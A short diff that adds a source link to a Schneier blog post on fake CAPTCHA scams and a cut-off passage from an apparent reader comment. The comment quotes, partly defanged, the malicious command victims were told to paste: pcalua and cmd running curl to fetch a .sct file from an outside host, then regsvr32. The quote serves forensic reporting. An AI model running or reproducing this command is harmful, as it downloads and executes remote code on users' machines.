@@ -1,0 +1,3 @@
+المصدر: https://www.schneier.com/blog/archives/2026/09/fake-captcha-scams.html
+
+at was to be ‘pasted’ and executed (can I post this here for forensic purposes?) pcalua[dot]exe -a cmd -c “/c curl[dot]exe -s https://193-233-126-53 [dot] sslip [dot] io/d3f8a142c9/verification[dot]sct -o %TEMP%\v[dot]sct&&regsvr32 /s 
